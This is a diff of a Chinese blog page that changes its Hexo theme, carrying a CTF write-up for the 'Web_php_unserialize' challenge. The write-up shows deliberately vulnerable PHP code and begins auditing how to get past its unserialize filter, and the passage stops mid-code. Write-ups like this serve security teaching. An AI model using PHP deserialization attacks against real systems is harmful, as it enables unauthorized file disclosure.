@@ -1,318 +1,21 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Noto Sans SC:300,300italic,400,400italic,700,700italic|consolas' , 'Noto Sans SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
-  <script src="/lib/pace/pace.min.js"></script>
-
-
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    hostname: new URL('http://moreant.github.io').hostname,
-    root: '/',
-    scheme: 'Muse',
-    version: '7.7.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},
-    copycode: {"enable":true,"show_result":"default","style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: true,
-    lazyload: false,
-    pangu: false,
-    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: 'search.xml',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
-  };
-</script>
-
-  <meta name="description" content="0x00 - 题目描述地址：https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;task&#x2F;answer?type&#x3D;web&amp;number&#x3D;3&amp;grade&#x3D;1&amp;id&#x3D;5409&amp;page&#x3D;1 PHP 反序列，老题新做了。  打开 index.php 是这样的">
-<meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界 WEB Web_php_unserialize">
-<meta property="og:url" content="http://moreant.github.io/post/60542.html">
-<meta property="og:site_name" content="莫居尘">
-<meta property="og:description" content="0x00 - 题目描述地址：https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;task&#x2F;answer?type&#x3D;web&amp;number&#x3D;3&amp;grade&#x3D;1&amp;id&#x3D;5409&amp;page&#x3D;1 PHP 反序列，老题新做了。  打开 index.php 是这样的">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200211215026.png">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200211215256.png">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200211233941.png">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200212001625.png">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200212011140.png">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200212003517.png">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200212004354.png">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200212005224.png">
-<meta property="og:image" content="http://moreant.github.io/post/.md_img/20200212005244.png">
-<meta property="article:published_time" content="2020-02-11T13:51:36.000Z">
-<meta property="article:modified_time" content="2020-12-06T01:57:26.136Z">
-<meta property="article:author" content="莫居尘 Moreant">
-<meta property="article:tag" content="信息安全">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://moreant.github.io/post/.md_img/20200211215026.png">
-
-<link rel="canonical" href="http://moreant.github.io/post/60542.html">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true
-  };
-</script>
-
-  <title>攻防世界 WEB Web_php_unserialize | 莫居尘</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">莫居尘</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-        <p class="site-subtitle">学习即输入输出</p>
-  </div>
-
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">27</span></a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">7</span></a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">36</span></a>
-
-  </li>
-        <li class="menu-item menu-item-笔记本">
-
-    <a href="https://moreant.github.io/notebook/" rel="section"><i class="fa fa-fw fa-book"></i>笔记本</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://moreant.github.io/post/60542.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://markdown.yeek.top/bolg/20191029/b8Ytj5Mons6f.jpg?imageslim">
-      <meta itemprop="name" content="莫居尘 Moreant">
-      <meta itemprop="description" content="别教了，我学不动了">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="莫居尘">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          攻防世界 WEB Web_php_unserialize<a href="https://github.com/moreant/moreant.github.io/edit/hexo/source/_posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-Web-php-unserialize.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil"></i></a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-02-11 21:51:36" itemprop="dateCreated datePublished" datetime="2020-02-11T21:51:36+08:00">2020-02-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-06 09:57:26" itemprop="dateModified" datetime="2020-12-06T09:57:26+08:00">2020-12-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h2 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h2><p>地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1</a></p>
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>攻防世界 WEB Web_php_unserialize - Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="0x00 - 题目描述地址：https:&amp;#x2F;&amp;#x2F;adworld.xctf.org.cn&amp;#x2F;task&amp;#x2F;answer?type&amp;#x3D;web&amp;amp;number&amp;#x3D;3&amp;amp;grade&amp;#x3D;1&amp;amp;id&amp;#x3D;5409&amp;amp;page&amp;#x3D;1 PHP 反序列，老题新做了。  打开 index.php 是这样的"><meta property="og:type" content="blog"><meta property="og:title" content="攻防世界 WEB Web_php_unserialize"><meta property="og:url" content="http://example.com/post/60542.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="0x00 - 题目描述地址：https:&amp;#x2F;&amp;#x2F;adworld.xctf.org.cn&amp;#x2F;task&amp;#x2F;answer?type&amp;#x3D;web&amp;amp;number&amp;#x3D;3&amp;amp;grade&amp;#x3D;1&amp;amp;id&amp;#x3D;5409&amp;amp;page&amp;#x3D;1 PHP 反序列，老题新做了。  打开 index.php 是这样的"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/post/.md_img/20200211215026.png"><meta property="og:image" content="http://example.com/post/.md_img/20200211215256.png"><meta property="og:image" content="http://example.com/post/.md_img/20200211233941.png"><meta property="og:image" content="http://example.com/post/.md_img/20200212001625.png"><meta property="og:image" content="http://example.com/post/.md_img/20200212011140.png"><meta property="og:image" content="http://example.com/post/.md_img/20200212003517.png"><meta property="og:image" content="http://example.com/post/.md_img/20200212004354.png"><meta property="og:image" content="http://example.com/post/.md_img/20200212005224.png"><meta property="og:image" content="http://example.com/post/.md_img/20200212005244.png"><meta property="article:published_time" content="2020-02-11T21:51:36.000Z"><meta property="article:modified_time" content="2020-12-22T12:04:06.982Z"><meta property="article:author" content="moreant"><meta property="article:tag" content="信息安全"><meta property="twitter:card" content="summary"><meta property="twitter:image" content=".md_img/20200211215026.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/post/60542.html"},"headline":"Hexo","image":["http://example.com/post/.md_img/20200211215026.png","http://example.com/post/.md_img/20200211215256.png","http://example.com/post/.md_img/20200211233941.png","http://example.com/post/.md_img/20200212001625.png","http://example.com/post/.md_img/20200212011140.png","http://example.com/post/.md_img/20200212003517.png","http://example.com/post/.md_img/20200212004354.png","http://example.com/post/.md_img/20200212005224.png","http://example.com/post/.md_img/20200212005244.png"],"datePublished":"2020-02-11T21:51:36.000Z","dateModified":"2020-12-22T12:04:06.982Z","author":{"@type":"Person","name":"moreant"},"description":"0x00 - 题目描述地址：https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;task&#x2F;answer?type&#x3D;web&amp;number&#x3D;3&amp;grade&#x3D;1&amp;id&#x3D;5409&amp;page&#x3D;1 PHP 反序列，老题新做了。  打开 index.php 是这样的"}</script><link rel="canonical" href="http://example.com/post/60542.html"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-02-11T21:51:36.000Z" title="2020-02-11T21:51:36.000Z">2020-02-11</time>发表</span><span class="level-item"><time dateTime="2020-12-22T12:04:06.982Z" title="2020-12-22T12:04:06.982Z">2020-12-22</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/ctf/">ctf</a></span><span class="level-item">12 分钟读完 (大约1781个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">攻防世界 WEB Web_php_unserialize</h1><div class="content"><h2 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h2><p>地址：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1</a></p>
 <p>PHP 反序列，老题新做了。</p>
-<p><img src=".md_img/20200211215026.png" alt=""></p>
+<p><img src=".md_img/20200211215026.png"></p>
 <p>打开 <code>index.php</code> 是这样的</p>
-<p><img src=".md_img/20200211215256.png" alt=""></p>
+<p><img src=".md_img/20200211215256.png"></p>
 <a id="more"></a>
 
 
 
 <h2 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 - 解题过程"></a>0x01 - 解题过程</h2><p>先审计一下代码，执行过程是从 17 行开始。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>首先得用 GET 传入 var ，不然的话就高亮 index.php 文件源码 （25行） </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// 高亮 index.php 的源码，效果就是题目描述的截图</span></span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// 高亮 index.php 的源码，效果就是题目描述的截图</span></span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 <p>接着对传入的 var 变量进行 base64 解码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br></pre></td></tr></table></figure>
 <p>解码后进行 <code>正则匹配</code> ，匹配到的话直接结束（<code>die</code>）并显示 <strong>stop hacking!</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
 <p>如果没匹配到就<strong>反序列化</strong> (后面再解释啥是 <code>序列化</code> 和 <code>反序列化</code>)。</p>
 <p>Q: 反序列化啥呢？</p>
 <p>A: 明显是要反序列化 2-16 行的 <code>Demo</code> 对象</p>
@@ -323,8 +26,7 @@
 <li>执行 <code>__construct</code> 方法，将传入的 <code>$file</code> 赋值给本地的<strong>私有</strong>方法 $file。请给私有画上重点，后面个<strong>巨坑</strong>跟这个私有有关系。</li>
 <li>销毁时执行 <code>__destruct</code> 方法，高亮本地变量 <code>file</code> 文件的代码</li>
 </ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span 